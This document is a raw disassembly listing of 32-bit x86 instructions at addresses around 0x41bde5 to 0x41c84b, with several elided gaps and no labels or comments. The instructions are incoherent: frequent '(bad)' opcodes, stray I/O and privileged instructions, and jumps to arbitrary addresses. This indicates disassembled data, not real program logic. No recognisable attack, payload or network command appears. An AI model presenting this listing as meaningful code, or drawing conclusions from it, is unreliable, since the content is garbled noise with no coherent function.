  41bde5:	mov    ds:0x94136cc1,al
  41bdea:	add    BYTE PTR [eax],al
  41bdec:	push   DWORD PTR [ebp-0x1895a93f]
  41bdf2:	loopne 0x41be6a
  41bdf4:	mov    al,ds:0xf1fea626
  41bdf9:	inc    edi
  41bdfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bdfb:	cs dec ebp
  41bdfd:	ds and eax,0x9425d3ca
  41be03:	sar    ebx,1
  41be05:	pop    esp
  41be06:	mul    BYTE PTR [ebp+edx*1-0x68]
  41be0a:	xor    eax,0xd4cf6032
  41be0f:	inc    ecx
  41be10:	sub    al,0xcd
  41be12:	adc    cl,BYTE PTR [eax+0x5c]
  41be15:	mov    eax,ds:0xc9db91ae
  41be1a:	and    eax,0xff7c928a
  41be1f:	ficom  DWORD PTR [ebx-0x6e]
  41be22:	push   eax
  41be23:	or     dl,cl
  41be25:	sub    DWORD PTR [ebx],edx
  41be27:	sub    BYTE PTR [ebx],dl
  41be29:	pop    esi
  41be2a:	cmp    ecx,esp
  41be2c:	hlt    
  41be2d:	push   cs
  41be2e:	loope  0x41beab
  41be30:	(bad)  
  41be31:	stc    
  41be32:	pop    ds
  41be33:	fnsave ds:0xd4d7590b
  41be39:	leave  
  41be3a:	(bad)  
  41be3b:	and    al,0x5a
  41be3d:	xor    BYTE PTR [eax],0xc9
  41be40:	ret    
  41be41:	jno    0x41be22
  41be43:	xlat   BYTE PTR ds:[ebx]
  41be44:	push   edi
  41be45:	and    eax,0xd461fd50
  41be4a:	arpl   WORD PTR [eax-0x4bd73cc2],cx
  41be50:	(bad)  
  41be51:	cli    
  41be52:	cdq    
  41be53:	mov    al,BYTE PTR [eax]
  41be55:	add    al,0xb8
  41be57:	pop    ebp
  41be58:	xchg   ebx,eax
  41be59:	or     al,0x3a
  41be5b:	loope  0x41be8c
  41be5d:	or     eax,0xda9cd419
  41be62:	adc    DWORD PTR [ebx-0x2f],eax
  41be65:	leave  
  41be66:	push   0xba0c76b2
  41be6b:	fwait
  41be6c:	jae    0x41be6e
	...
  41bed6:	test   DWORD PTR [ebp+0x7b9c6a9c],ecx
  41bedc:	imul   edi
  41bede:	mov    ebp,DWORD PTR [ecx+0x21473f66]
  41bee4:	or     BYTE PTR [ebx+0x12],ch
  41bee7:	sub    al,0x1
  41bee9:	add    bh,bh
  41beeb:	add    BYTE PTR [eax],al
  41beed:	add    BYTE PTR [ebx+0x41],ch
  41bef0:	xor    edx,ebx
  41bef2:	pop    ss
  41bef3:	jno    0x41be79
  41bef5:	xchg   edx,eax
  41bef6:	mov    dh,0xe3
  41bef8:	mov    eax,0x34845bc2
  41befd:	sub    edx,ebp
  41beff:	sbb    edx,esi
  41bf01:	(bad)  
  41bf02:	jbe    0x41bf0b
  41bf04:	jl     0x41bec0
  41bf06:	mov    ebp,0x2122a956
  41bf0b:	enter  0x7637,0x68
  41bf0f:	or     BYTE PTR [edi-0x2f],ah
  41bf12:	jl     0x41bedc
  41bf14:	mov    cl,BYTE PTR [esi-0x54f6ca89]
  41bf1a:	stos   BYTE PTR es:[edi],al
  41bf1b:	aaa    
  41bf1c:	mov    eax,0x365e4f0f
  41bf21:	adc    al,0x18
  41bf23:	xchg   BYTE PTR [ecx],al
  41bf25:	mov    ebp,0x1d321f38
  41bf2a:	cs push 0xffffffda
  41bf2d:	fcom   QWORD PTR [ebx]
  41bf30:	(bad)  
  41bf31:	daa    
  41bf32:	nop
  41bf33:	mov    eax,DWORD PTR [edi+0x1c48e4d6]
  41bf39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf3a:	mov    esi,0x7182e1b5
  41bf3f:	mov    ecx,DWORD PTR [ebx+0x2ea80686]
  41bf45:	lds    edi,FWORD PTR ds:0xd3f3a635
  41bf4b:	inc    ecx
  41bf4c:	mov    ebx,0xfc804f4f
  41bf51:	lock jns 0x41beea
  41bf54:	cwde   
  41bf55:	test   eax,0xe9f48d69
  41bf5a:	xor    ah,bl
  41bf5c:	inc    esi
  41bf5d:	(bad)  
  41bf5e:	(bad)  
  41bf5f:	jns    0x41bfb2
  41bf61:	lahf   
  41bf62:	dec    ecx
  41bf63:	pop    es
  41bf64:	cmp    BYTE PTR [ebp-0x6ee687a3],bl
  41bf6a:	add    cl,BYTE PTR [ebp+0x4d]
  41bf6d:	lock xchg esi,eax
  41bf6f:	xor    eax,DWORD PTR [esi]
  41bf71:	jle    0x41bf1e
  41bf73:	xchg   edx,eax
  41bf74:	sar    bl,cl
  41bf76:	mov    dl,0x52
  41bf78:	mov    DWORD PTR [ecx+ebp*8+0x59cc6ffe],edx
  41bf7f:	daa    
  41bf80:	jne    0x41bfcb
  41bf82:	cmp    al,bh
  41bf84:	div    BYTE PTR [eax]
  41bf86:	aas    
  41bf87:	adc    al,0xba
  41bf89:	mov    ah,0xee
  41bf8b:	aam    0x5d
  41bf8d:	lahf   
  41bf8e:	(bad)  
  41bf91:	bound  ecx,QWORD PTR [edi-0x4906d2a2]
  41bf97:	jle    0x41c014
  41bf99:	cdq    
  41bf9a:	aaa    
  41bf9b:	jmp    DWORD PTR [esi+0x46]
  41bf9e:	pop    eax
  41bfa0:	xchg   edi,eax
  41bfa1:	in     eax,dx
  41bfa2:	gs retf 0x1cf3
  41bfa6:	mov    BYTE PTR [eax-0x29a3de8d],cl
  41bfac:	mov    DWORD PTR [eax],esp
  41bfae:	rcl    DWORD PTR [esi],1
  41bfb0:	xor    eax,0x1ff58096
  41bfb5:	pop    esi
  41bfb6:	call   0x408988f5
  41bfbb:	js     0x41bfbf
  41bfbd:	mov    dl,0x11
  41bfbf:	sbb    ch,dh
  41bfc1:	cmp    al,0x3
  41bfc3:	pop    es
  41bfc4:	outs   dx,BYTE PTR ds:[esi]
  41bfc5:	and    dl,BYTE PTR [eax+0x24]
  41bfc8:	es push esp
  41bfca:	push   0x4fdc9f4d
  41bfcf:	or     BYTE PTR cs:[eax],cl
  41bfd2:	mov    bh,al
  41bfd4:	mov    edx,0x9643e37c
  41bfd9:	xchg   ebp,eax
  41bfda:	loopne 0x41bfea
  41bfdc:	pop    edx
  41bfdd:	dec    ebp
  41bfde:	imul   ebx,DWORD PTR [edx-0x33c5492e],0xffffffc3
  41bfe5:	or     al,0x7e
  41bfe7:	outs   dx,DWORD PTR ds:[esi]
  41bfe8:	mov    ebx,0xc9a3334c
	...
  41c055:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41c059:	es aaa 
  41c05b:	data16 jne 0x41c0d1
  41c05e:	ins    BYTE PTR es:[edi],dx
  41c05f:	daa    
  41c060:	mov    cl,0xc1
  41c062:	loopne 0x41bfef
  41c064:	loope  0x41c0a9
  41c066:	adc    DWORD PTR ds:0xff0001,ebp
  41c06c:	add    BYTE PTR [eax],al
  41c06e:	sub    bl,BYTE PTR [edx-0x3507683c]
  41c074:	push   0xffffffcc
  41c076:	mov    ds:0x4b350283,eax
  41c07b:	int    0xb8
  41c07d:	push   esp
  41c07e:	(bad)  
  41c080:	or     dl,BYTE PTR [edi+0x1dd58a1c]
  41c086:	inc    esp
  41c087:	idiv   BYTE PTR [edx+0x1edd1ea6]
  41c08d:	adc    DWORD PTR [ecx],eax
  41c08f:	mov    eax,ds:0x2083be93
  41c094:	shl    DWORD PTR [ecx-0x4c],cl
  41c097:	xchg   edx,eax
  41c098:	mov    WORD PTR ds:0xd00321eb,es
  41c09e:	repz add edi,ebx
  41c0a1:	ret    
  41c0a2:	loop   0x41c123
  41c0a4:	das    
  41c0a5:	jns    0x41c0f4
  41c0a7:	xor    esi,DWORD PTR ds:[ebx-0x77]
  41c0ab:	push   ebp
  41c0ac:	call   0xa97:0x87fcde94
  41c0b3:	cmp    al,0x4
  41c0b5:	or     al,0x75
  41c0b7:	scas   al,BYTE PTR es:[edi]
  41c0b8:	pushf  
  41c0b9:	cmc    
  41c0ba:	(bad)  
  41c0bb:	div    edx
  41c0bd:	pushf  
  41c0be:	cli    
  41c0bf:	xchg   esi,eax
  41c0c0:	pop    eax
  41c0c1:	fimul  WORD PTR [edx+edi*1-0x33]
  41c0c5:	pushf  
  41c0c6:	stc    
  41c0c7:	push   edx
  41c0c8:	pop    ebp
  41c0c9:	arpl   WORD PTR ds:0x54d0b818,bx
  41c0cf:	and    eax,0xf27fbc74
  41c0d4:	inc    ebp
  41c0d5:	xchg   ebp,eax
  41c0d6:	cmp    DWORD PTR [edx+0x79672742],ebx
  41c0dc:	sub    al,0x52
  41c0de:	mov    edx,DWORD PTR [ebp-0x944571b]
  41c0e4:	mov    ds:0xbf30572a,eax
  41c0e9:	fwait
  41c0ea:	pop    ecx
  41c0eb:	dec    eax
  41c0ec:	scas   al,BYTE PTR es:[edi]
  41c0ed:	or     DWORD PTR [ebp+ebp*2+0x41],0x43336f5c
  41c0f5:	test   BYTE PTR [edx],ch
  41c0f7:	call   0x6870cbc1
  41c0fc:	mov    ds:0xb8e01b83,eax
  41c101:	or     dh,BYTE PTR [edi]
  41c103:	scas   eax,DWORD PTR es:[edi]
  41c104:	repz sub BYTE PTR [esi+0x62],bh
  41c108:	shr    BYTE PTR [edx+0x18cfaa84],cl
  41c10e:	stos   DWORD PTR es:[edi],eax
  41c10f:	fisubr WORD PTR [ecx-0x3cea8c1]
  41c115:	lods   al,BYTE PTR ds:[esi]
  41c116:	and    eax,0xae815de1
  41c11b:	jle    0x41c123
  41c11d:	xchg   BYTE PTR [ebp+ebp*1+0x62],ch
  41c121:	sub    dl,BYTE PTR [ebx]
  41c123:	push   esi
  41c124:	aad    0x94
  41c126:	dec    ecx
  41c127:	stc    
  41c128:	mov    ebp,0x3cabdd5e
  41c12d:	dec    edi
  41c12e:	xchg   esi,eax
  41c12f:	or     dl,BYTE PTR [ebp+0x74]
  41c132:	std    
  41c133:	inc    edx
  41c134:	xor    al,0x16
  41c136:	mov    bl,0x4c
  41c138:	mov    edx,0x51948891
  41c13d:	add    al,0x20
  41c13f:	xor    dl,BYTE PTR [ebx]
  41c141:	jne    0x41c1b3
  41c143:	mov    eax,DWORD PTR [eax-0x2dd54235]
  41c149:	jo     0x41c18b
  41c14b:	not    ah
  41c14d:	in     eax,0xb4
  41c14f:	mov    cs,WORD PTR [edx+0x35ae390f]
  41c155:	xor    eax,0x1d179f7
  41c15a:	fs into 
  41c15c:	push   ds
  41c15d:	sar    DWORD PTR [esi+eax*1],1
  41c160:	jp     0x41c171
  41c162:	ja     0x41c150
  41c164:	adc    ebx,DWORD PTR [ecx+0x67599358]
  41c16a:	fnsave [ebx-0x73]
	...
  41c1d5:	add    cl,bl
  41c1d7:	dec    edx
  41c1d8:	mov    eax,ds:0xd9fbb3f8
  41c1dd:	imul   edi,DWORD PTR ds:0xe90501,0xa
  41c1e4:	repnz mov ch,0x10
  41c1e7:	add    DWORD PTR cs:[eax],eax
  41c1ea:	inc    DWORD PTR [eax]
  41c1ec:	add    BYTE PTR [eax],al
  41c1ee:	jmp    0xea3a6e8c
  41c1f3:	int    0x94
  41c1f5:	je     0x41c1fa
  41c1f7:	sti    
  41c1f8:	cmp    al,0x11
  41c1fa:	retf   0x7cd4
  41c1fd:	cs repz pop ebx
  41c200:	cmp    DWORD PTR [ebp-0x1e07c706],0x9e47afad
  41c20a:	fst    QWORD PTR ds:0x1adb50da
  41c210:	fwait
  41c211:	xchg   edx,eax
  41c212:	add    cl,BYTE PTR [edx+0xe]
  41c215:	xchg   edi,eax
  41c216:	cmp    al,0xa1
  41c218:	sbb    DWORD PTR [esi-0x31f145f1],esp
  41c21e:	push   cs
  41c21f:	cld    
  41c220:	push   ebx
  41c221:	mov    bh,BYTE PTR [eax+0x2052dc39]
  41c227:	shr    esi,0x7a
  41c22a:	mov    edi,0x6a343470
  41c22f:	jg     0x41c231
  41c231:	dec    esp
  41c232:	cmp    esi,0x68
  41c235:	addr16 sbb al,0x1f
  41c238:	loopne 0x41c27c
  41c23a:	mov    eax,ds:0xdcc258a1
  41c23f:	jno    0x41c27d
  41c241:	pop    edx
  41c242:	mov    dl,BYTE PTR [edx]
  41c244:	jmp    0x41c241
  41c246:	neg    DWORD PTR [esi+ecx*4-0xf]
  41c24a:	mov    ds:0xa3e23368,eax
  41c24f:	je     0x41c264
  41c251:	push   edx
  41c252:	aaa    
  41c253:	jmp    0x574d:0x86c37752
  41c25a:	xor    BYTE PTR [eax],cl
  41c25c:	int    0xb2
  41c25e:	inc    ecx
  41c25f:	data16 xor al,bh
  41c262:	cmp    BYTE PTR [edi],al
  41c264:	mov    ds:0xa8a94e5,al
  41c269:	sbb    BYTE PTR [eax-0x37],dl
  41c26c:	(bad)  
  41c26d:	loope  0x41c252
  41c26f:	pop    ebp
  41c270:	xchg   eax,ecx
  41c272:	sub    eax,0x4354e5aa
  41c277:	std    
  41c278:	test   esi,ebp
  41c27a:	xor    eax,0xceea829b
  41c27f:	nop
  41c280:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c281:	and    edi,edi
  41c283:	sbb    bh,BYTE PTR ds:0xa66fa383
  41c289:	jb     0x41c2f6
  41c28b:	xchg   ecx,eax
  41c28c:	imul   ecx,DWORD PTR [ebx-0x10],0xc5ab9aee
  41c293:	ja     0x41c2ec
  41c295:	xor    DWORD PTR ds:0xdad31ad7,ebx
  41c29b:	and    al,0x1d
  41c29d:	ret    
  41c29e:	ret    0xdd5
  41c2a1:	js     0x41c2da
  41c2a3:	je     0x41c29e
  41c2a5:	outs   dx,DWORD PTR ds:[esi]
  41c2a6:	popf   
  41c2a7:	adc    BYTE PTR [ecx+0x171b07b],0xb
  41c2ae:	add    eax,0xba1e37a9
  41c2b3:	adc    eax,0xde7afd91
  41c2b8:	fdivr  st,st(3)
  41c2ba:	xor    DWORD PTR [edi-0x397c29fe],esp
  41c2c0:	leave  
  41c2c1:	(bad)
  41c2c4:	ret    0x1615
  41c2c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2c8:	pop    edi
  41c2c9:	jae    0x41c335
  41c2cb:	mov    dh,0x12
  41c2cd:	aas    
  41c2ce:	and    eax,0xb5f10f20
  41c2d3:	jb     0x41c2d4
  41c2d5:	or     eax,0xfdf1f7dc
  41c2da:	xchg   ebx,eax
  41c2db:	shl    edx,cl
  41c2dd:	cmp    al,0x8d
  41c2df:	push   ecx
  41c2e0:	mov    ecx,ebp
  41c2e2:	pop    es
  41c2e3:	(bad)  
  41c2e4:	sbb    bl,ch
  41c2e6:	arpl   WORD PTR [edx],sp
  41c2e8:	ret    0xe17f
  41c2eb:	stc    
  41c2ec:	xchg   ebx,eax
	...
  41c355:	add    bl,dh
  41c357:	and    ebp,ecx
  41c359:	push   ebp
  41c35a:	(bad)  
  41c35c:	sti    
  41c35d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c35e:	enter  0x1a95,0x14
  41c362:	sbb    bl,BYTE PTR [edi-0x66]
  41c365:	(bad)  [edi]
  41c367:	das    
  41c368:	add    DWORD PTR [eax],eax
  41c36a:	inc    DWORD PTR [eax]
  41c36c:	add    BYTE PTR [eax],al
  41c36e:	add    dl,ah
  41c370:	in     al,0x3a
  41c372:	sbb    dh,BYTE PTR ds:0x9ab85d89
  41c378:	div    BYTE PTR [esi*4+0x34f3b9a0]
  41c37f:	jmp    0xfb691c85
  41c384:	test   eax,0xa490adfb
  41c389:	inc    ebp
  41c38a:	sub    eax,DWORD PTR [edx+0x2d]
  41c38d:	add    edi,DWORD PTR [eax+0x52f9856b]
  41c393:	jbe    0x41c3f6
  41c395:	loope  0x41c3fb
  41c397:	adc    eax,0x7e96585
  41c39c:	sub    BYTE PTR [eax],dl
  41c39e:	push   es
  41c39f:	jle    0x41c3d3
  41c3a1:	cli    
  41c3a2:	mov    ebx,DWORD PTR [edi+0x43]
  41c3a5:	jnp    0x41c3a9
  41c3a7:	xchg   edx,eax
  41c3a8:	lods   al,BYTE PTR ds:[esi]
  41c3a9:	xor    BYTE PTR [ecx+edi*8],dh
  41c3ac:	cwde   
  41c3ad:	(bad)  
  41c3ae:	mov    eax,0xf07f5f07
  41c3b3:	xor    eax,0xb19aac33
  41c3b8:	call   0xe913e71a
  41c3bd:	nop
  41c3be:	mov    ch,0xe3
  41c3c0:	repnz push 0x74c0e583
  41c3c6:	pusha  
  41c3c7:	mov    ah,0x73
  41c3c9:	pop    es
  41c3ca:	and    DWORD PTR [esi],esp
  41c3cc:	(bad)  [ebp-0x2e67cbfa]
  41c3d2:	and    al,BYTE PTR [edx+0x41cb6164]
  41c3d8:	push   esp
  41c3d9:	xchg   esp,eax
  41c3da:	or     al,0x47
  41c3dc:	mov    BYTE PTR ds:0xa46ba1db,cl
  41c3e2:	out    dx,al
  41c3e3:	mov    ds:0xae961617,al
  41c3e8:	stos   DWORD PTR es:[edi],eax
  41c3e9:	jl     0x41c427
  41c3eb:	xor    edx,DWORD PTR [ebp+0x5e]
  41c3ee:	dec    esp
  41c3ef:	jp     0x41c3bd
  41c3f1:	and    ebp,DWORD PTR [ebx]
  41c3f3:	(bad)  [edi-0x56e9379c]
  41c3f9:	in     al,dx
  41c3fa:	adc    al,0xfb
  41c3fc:	mov    ds:0xcbdfc10c,al
  41c401:	push   ebx
  41c402:	jns    0x41c41d
  41c404:	cwde   
  41c405:	stc    
  41c406:	bound  esi,QWORD PTR [ecx+ebp*1-0x3d]
  41c40a:	mov    al,dh
  41c40c:	mov    ch,0x27
  41c40e:	xor    esp,DWORD PTR [edx-0x2c]
  41c411:	pop    esi
  41c412:	mov    bh,BYTE PTR [edi+0x13]
  41c415:	push   esp
  41c417:	sbb    DWORD PTR [edx+0x63],esi
  41c41a:	mov    ah,0x39
  41c41c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c41d:	imul   eax,DWORD PTR [esi+ebp*1],0xffffffd4
  41c421:	(bad)  
  41c422:	in     eax,0xb4
  41c424:	sub    BYTE PTR [edi],al
  41c426:	(bad)  ds:0xc5ce0558
  41c42c:	cmp    BYTE PTR [ecx+0x6d],bl
  41c42f:	test   edi,esp
  41c431:	(bad)  
  41c432:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c433:	mov    BYTE PTR [edi+0x7f031826],bl
  41c439:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c43a:	pop    ss
  41c43b:	and    DWORD PTR [ebp-0x3dffb9a3],esi
  41c441:	lahf   
  41c442:	dec    ecx
  41c443:	jl     0x41c43c
  41c445:	sbb    eax,0x1b8199fb
  41c44a:	and    esi,edx
  41c44c:	xor    DWORD PTR [edx-0x3a],esi
  41c44f:	sub    al,0xfa
  41c451:	pop    ebp
  41c452:	pop    ebx
  41c453:	xchg   DWORD PTR [ebx+0x4],ecx
  41c456:	mov    dl,BYTE PTR [edi+0x590c0062]
  41c45c:	clc    
  41c45d:	lock mov ds:0xdc85e218,eax
  41c463:	xor    al,0x32
  41c465:	das    
  41c466:	loopne 0x41c4bc
  41c468:	mov    esi,0x1edf67e8
	...
  41c4d5:	add    BYTE PTR [ebx+0x20],dl
  41c4d8:	mov    al,ds:0x5faef3ae
  41c4dd:	std    
  41c4de:	mov    bl,0x35
  41c4e0:	dec    ebp
  41c4e1:	push   ecx
  41c4e2:	(bad)
  41c4e5:	stos   DWORD PTR es:[edi],eax
  41c4e6:	push   cs
  41c4e7:	xor    BYTE PTR [ecx],al
  41c4e9:	add    bh,bh
  41c4eb:	add    BYTE PTR [eax],al
  41c4ed:	add    BYTE PTR [ebx-0x4894856a],bh
  41c4f3:	mov    ds:0x9987b75c,al
  41c4f8:	fsubr  QWORD PTR [ebx]
  41c4fa:	mov    ah,0xe2
  41c4fc:	popa   
  41c4fd:	inc    ebx
  41c4fe:	xchg   ebp,eax
  41c4ff:	lods   eax,DWORD PTR ds:[esi]
  41c500:	pop    ds
  41c501:	sbb    BYTE PTR [ebx],0xd8
  41c504:	adc    al,BYTE PTR [esi-0x7f4e4c05]
  41c50a:	test   eax,0x26813205
  41c50f:	(bad)  
  41c510:	sti    
  41c511:	add    edx,DWORD PTR [esi-0x6b16f44f]
  41c517:	cld    
  41c518:	or     eax,0xfc06dfbc
  41c51d:	loope  0x41c535
  41c51f:	mov    edi,0x22f1e841
  41c524:	sbb    eax,0xbf0da6bd
  41c529:	push   esi
  41c52a:	fst    QWORD PTR [esi-0x1688092]
  41c530:	push   0x6d954683
  41c535:	pop    ebp
  41c536:	ins    DWORD PTR es:[edi],dx
  41c537:	lahf   
  41c538:	inc    ecx
  41c539:	std    
  41c53a:	push   ss
  41c53b:	and    ebx,DWORD PTR [ebp-0x46]
  41c53e:	or     dl,BYTE PTR [edx+0x7edd1553]
  41c544:	xor    BYTE PTR [edx],ah
  41c546:	inc    edi
  41c547:	retf   0x68d1
  41c54a:	enter  0xdb12,0x69
  41c54e:	aas    
  41c54f:	loope  0x41c559
  41c551:	push   DWORD PTR [ebx-0x28943bd0]
  41c557:	push   ecx
  41c558:	popf   
  41c559:	inc    esp
  41c55a:	add    eax,0x8966a9c9
  41c55f:	xor    al,0x31
  41c561:	add    dh,ch
  41c563:	popa   
  41c564:	retf   
  41c565:	add    al,0xfb
  41c567:	sub    dh,BYTE PTR [ebp+eiz*2-0x5b58fed2]
  41c56e:	and    edi,0xfa6575ef
  41c574:	xchg   edi,eax
  41c575:	shl    DWORD PTR [ebx-0x33caf0b],0x89
  41c57c:	xor    al,0x4d
  41c57e:	jmp    0x41c5dd
  41c580:	cmp    DWORD PTR [edi-0x54],0x6a651c71
  41c587:	cdq    
  41c588:	sahf   
  41c589:	iret   
  41c58a:	sahf   
  41c58b:	popa   
  41c58c:	mov    bh,0x13
  41c58e:	sti    
  41c58f:	jg     0x41c530
  41c591:	dec    edi
  41c592:	test   DWORD PTR [edi-0x57],edx
  41c595:	adc    ebx,edi
  41c597:	outs   dx,BYTE PTR ds:[esi]
  41c598:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c599:	push   edx
  41c59a:	dec    ebx
  41c59b:	mov    dl,0x3
  41c59d:	mov    ebp,es
  41c59f:	cli    
  41c5a0:	jecxz  0x41c53c
  41c5a2:	push   ecx
  41c5a3:	outs   dx,BYTE PTR ds:[esi]
  41c5a4:	mov    al,BYTE PTR [ebx]
  41c5a6:	sub    DWORD PTR [eax+0x18],ecx
  41c5a9:	pop    ds
  41c5aa:	add    DWORD PTR [edx+0x59289085],ebx
  41c5b0:	popf   
  41c5b1:	sahf   
  41c5b2:	imul   ecx,DWORD PTR [ecx],0xffffffd5
  41c5b5:	(bad)  
  41c5b6:	mov    dl,0xe7
  41c5b8:	jo     0x41c618
  41c5ba:	test   eax,0xd50566b2
  41c5bf:	ins    BYTE PTR es:[edi],dx
  41c5c0:	mov    eax,ds:0xed2adb41
  41c5c5:	xchg   esp,eax
  41c5c6:	dec    ecx
  41c5c7:	mov    bh,0x32
  41c5c9:	push   edx
  41c5ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5cb:	data16 sahf 
  41c5cd:	sub    bh,ch
  41c5cf:	xchg   DWORD PTR [eax-0x16d5f03c],eax
  41c5d5:	enter  0xd021,0xdb
  41c5d9:	cmp    esp,DWORD PTR [esi]
  41c5db:	jl     0x41c63a
  41c5dd:	mov    ds:0xa20372af,al
  41c5e2:	inc    eax
  41c5e3:	cs test al,0xb0
  41c5e6:	mov    ebx,0xf52c6c06
  41c5eb:	dec    edi
  41c5ec:	daa    
	...
  41c655:	add    ch,al
  41c657:	and    edx,DWORD PTR [ecx-0xa4808db]
  41c65d:	jecxz  0x41c6a2
  41c65f:	and    ch,ch
  41c661:	call   0x310d:0x67a240c4
  41c668:	add    DWORD PTR [eax],eax
  41c66a:	inc    DWORD PTR [eax]
  41c66c:	add    BYTE PTR [eax],al
  41c66e:	lea    esp,[edi]
  41c670:	xchg   esp,eax
  41c671:	pushf  
  41c672:	scas   al,BYTE PTR es:[edi]
  41c673:	mov    edi,DWORD PTR [ecx+0xf]
  41c676:	and    DWORD PTR [edx],edx
  41c678:	scas   eax,DWORD PTR es:[edi]
  41c679:	call   0xfb208bb
  41c67e:	sub    BYTE PTR [ebp+0x4d],ch
  41c681:	or     BYTE PTR [ecx],al
  41c683:	sbb    DWORD PTR [ecx+0x1d],esp
  41c686:	aam    0xb
  41c688:	mov    eax,0xdc5e74bf
  41c68d:	das    
  41c68e:	sub    esi,DWORD PTR [ecx+eiz*2-0x7fb17aca]
  41c695:	lds    ecx,FWORD PTR [eax-0xf40c7d8]
  41c69b:	mov    esp,0x9cdd2c28
  41c6a0:	mov    ebx,0x64d279a6
  41c6a5:	dec    esi
  41c6a6:	jbe    0x41c65b
  41c6a8:	loopne 0x41c6cf
  41c6aa:	iret   
  41c6ab:	jmp    0xfe7f2e11
  41c6b0:	xchg   esp,eax
  41c6b1:	sbb    bh,dh
  41c6b3:	pushf  
  41c6b4:	fld    DWORD PTR [esi]
  41c6b6:	pop    es
  41c6b7:	ret    
  41c6b8:	aad    0x7e
  41c6ba:	ds hlt 
  41c6bc:	aas    
  41c6bd:	add    edi,DWORD PTR [ebp-0x1be4d85]
  41c6c3:	sub    DWORD PTR [edx+0x66dc389d],ebp
  41c6c9:	fiadd  WORD PTR [ebx-0xf505fb3]
  41c6cf:	ss mov dl,0xa2
  41c6d2:	psllw  mm4,mm5
  41c6d5:	sub    eax,0x16856ecb
  41c6da:	sbb    ah,BYTE PTR cs:[ebp-0x72]
  41c6de:	jno    0x41c6d3
  41c6e0:	cwde   
  41c6e1:	mov    edi,0x9d6ce214
  41c6e6:	test   BYTE PTR [eax-0x135dee62],cl
  41c6ec:	inc    ebx
  41c6ed:	sti    
  41c6ee:	and    DWORD PTR [eax],esp
  41c6f0:	fmul   DWORD PTR [ecx+edx*8-0x69bd492]
  41c6f7:	jnp    0x41c6fd
  41c6f9:	dec    esi
  41c6fa:	add    ebx,DWORD PTR [eax-0x7d]
  41c6fd:	in     eax,dx
  41c6fe:	std    
  41c6ff:	mov    eax,0x32fb6ed
  41c704:	(bad)  
  41c705:	push   eax
  41c706:	bswap  esp
  41c708:	mov    ch,0xee
  41c70a:	jmp    0x41c6a8
  41c70c:	mov    ebp,edx
  41c70e:	fist   WORD PTR [ebp+0x17]
  41c711:	cmp    ecx,DWORD PTR [eax]
  41c713:	cdq    
  41c714:	mov    ecx,0xe8ae441b
  41c719:	mov    bl,0x18
  41c71b:	sahf   
  41c71c:	mov    al,0x22
  41c71e:	or     DWORD PTR [eax+0x4fe27985],0x19
  41c725:	in     al,0x9b
  41c727:	sbb    DWORD PTR [edx],0xffffffe1
  41c72a:	fsub   DWORD PTR [edx]
  41c72c:	mov    bh,0xd6
  41c72e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c72f:	and    ebp,DWORD PTR [eax+0x20ca2532]
  41c735:	inc    ebx
  41c736:	test   eax,0x72e0a780
  41c73b:	cmp    DWORD PTR [ebp-0x8],0x596c4218
  41c742:	std    
  41c743:	aam    0x18
  41c745:	add    esp,edx
  41c747:	neg    dh
  41c749:	sbb    eax,0x9a0f22e7
  41c74e:	and    bl,dl
  41c750:	in     eax,dx
  41c751:	ficomp DWORD PTR [ecx+0xe]
  41c754:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c755:	dec    edx
  41c756:	inc    esp
  41c757:	or     ebx,DWORD PTR [eax]
  41c759:	inc    esi
  41c75a:	push   ecx
  41c75b:	inc    esi
  41c75c:	xor    dh,0x65
  41c75f:	add    dl,BYTE PTR [ecx]
  41c761:	jg     0x41c724
  41c763:	fistp  WORD PTR [edi+0x1e]
  41c766:	push   ds
  41c767:	ins    DWORD PTR es:[edi],dx
  41c768:	test   BYTE PTR [ebp-0x69],dh
  41c76b:	pop    eax
  41c76c:	jb     0x41c76e
	...
  41c7d6:	fiadd  DWORD PTR [ecx]
  41c7d8:	ret    0xdb86
  41c7db:	(bad)  
  41c7dc:	ficomp WORD PTR [ebp-0xf]
  41c7df:	cmp    DWORD PTR [esi],esi
  41c7e1:	lahf   
  41c7e2:	lea    ebx,[eax]
  41c7e4:	xchg   esp,eax
  41c7e5:	popa   
  41c7e6:	or     al,0x32
  41c7e8:	add    DWORD PTR [eax],eax
  41c7ea:	inc    DWORD PTR [eax]
  41c7ec:	add    BYTE PTR [eax],al
  41c7ee:	and    DWORD PTR [eax+0x2b2d34c3],ecx
  41c7f4:	xchg   ecx,eax
  41c7f5:	jb     0x41c7d1
  41c7f7:	ret    
  41c7f8:	mov    al,0x12
  41c7fa:	repz push ds
  41c7fc:	cli    
  41c7fd:	dec    edi
  41c7fe:	push   0x6
  41c800:	ds loop 0x41c82c
  41c803:	aam    0xb
  41c805:	inc    esp
  41c806:	inc    esi
  41c807:	outs   dx,BYTE PTR ds:[esi]
  41c808:	(bad)  
  41c809:	adc    ch,BYTE PTR [ecx+0x5d]
  41c80c:	mov    dh,0x45
  41c80e:	mov    bh,0xc2
  41c810:	bound  edi,QWORD PTR [esp+esi*2]
  41c813:	int3   
  41c814:	jecxz  0x41c83a
  41c816:	fld    QWORD PTR [edx]
  41c818:	mov    bh,0x35
  41c81a:	rol    DWORD PTR [edi-0x6b9f86cc],1
  41c820:	pushf  
  41c821:	adc    dh,BYTE PTR ds:0x2f3c0e88
  41c827:	in     eax,0x13
  41c829:	mov    eax,ds:0xd28d60be
  41c82e:	jno    0x41c7ca
  41c830:	fs dec esp
  41c832:	sub    eax,0x1773159c
  41c837:	pop    esp
  41c838:	das    
  41c839:	dec    ebx
  41c83a:	push   eax
  41c83b:	cmp    DWORD PTR [edx-0x1d343682],ecx
  41c841:	mov    bl,0x19
  41c843:	sbb    BYTE PTR [eax+0x70b1e404],dl
  41c849:	rol    BYTE PTR [edx],cl
  41c84b:	repz sti 
